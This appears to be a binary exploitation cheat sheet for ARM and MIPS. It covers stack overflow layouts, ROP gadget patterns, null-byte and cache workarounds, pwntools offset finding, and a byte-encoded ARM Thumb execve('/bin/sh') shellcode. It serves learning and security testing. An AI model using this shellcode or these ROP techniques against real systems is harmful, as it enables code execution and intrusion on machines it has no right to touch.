# Architecture-Specific Exploitation

## ARM Exploitation

### Stack Frame Layout
```
High Address
+------------------+
| saved LR         |  <-- overflow target
+------------------+
| saved R11 (FP)   |
+------------------+
| local variables  |
+------------------+
| buffer[N]        |  <-- overflow starts here
+------------------+
Low Address
```

### ARM ROP Gadgets
```bash
# Find gadgets with ROPgadget
ROPgadget --binary <binary> --depth 5

# Useful ARM gadget patterns:
# Control PC:  POP {R0-R3, PC}
# Call system: MOV R0, <arg>; BL system
# Stack pivot: ADD SP, SP, #N; POP {PC}
```

### ARM Shellcode Considerations
- Avoid null bytes (0x00) in payload
- Thumb mode shellcode is more compact (2-byte instructions)
- Use SVC 0 (ARM) or SVC 1 (Thumb) for syscalls
- execve("/bin/sh", NULL, NULL) = syscall 11

### Example: ARM execve shellcode (Thumb mode, 28 bytes)
```python
shellcode = (
    b"\x01\x30\x8f\xe2"  # add r3, pc, #1
    b"\x13\xff\x2f\xe1"  # bx r3 (switch to Thumb)
    b"\x78\x46"          # mov r0, pc
    b"\x0c\x30"          # adds r0, #12
    b"\x01\x90"          # str r0, [sp, #4]
    b"\x01\xa9"          # add r1, sp, #4
    b"\x92\x1a"          # subs r2, r2, r2
    b"\x0b\x27"          # movs r7, #11 (execve)
    b"\x01\xdf"          # svc 1
    b"/bin/sh\x00"
)
```

## MIPS Exploitation

### Stack Frame Layout
```
High Address
+------------------+
| saved $ra        |  <-- overflow target
+------------------+
| saved $s0-$s7    |
+------------------+
| local variables  |
+------------------+
| buffer[N]        |
+------------------+
Low Address
```

### MIPS Cache Problem
MIPS has separate instruction cache (I-cache) and data cache (D-cache).
When shellcode is written to stack, it enters D-cache but I-cache still has old data.

**Solutions:**
1. Call `sleep(1)` via ROP before jumping to shellcode
2. Use `cacheflush()` syscall via ROP
3. Jump to shellcode in a `.data` section (already in I-cache)

### MIPS Null Byte Problem
Many MIPS addresses contain 0x00 bytes (e.g., 0x0040xxxx).

**Solutions:**
1. Use addresses from shared libraries (higher addresses, fewer nulls)
2. XOR encode addresses and decode with ROP gadget
3. Use `li` + `xor` gadget chains

### MIPS ROP Gadgets
```bash
# Useful MIPS gadget patterns:
# Load $ra:  lw $ra, offset($sp); jr $ra
# Call system: addiu $a0, $sp, offset; lw $t9, offset($s0); jalr $t9
# Stack pivot: addiu $sp, $sp, N; lw $ra, offset($sp); jr $ra
```

## Cyclic Pattern for Offset Finding
```python
from pwn import cyclic, cyclic_find
# Generate pattern
pattern = cyclic(500)
# After crash, find offset
offset = cyclic_find(0x61616171)  # Value at crash point
print(f"Offset to return address: {offset}")
```
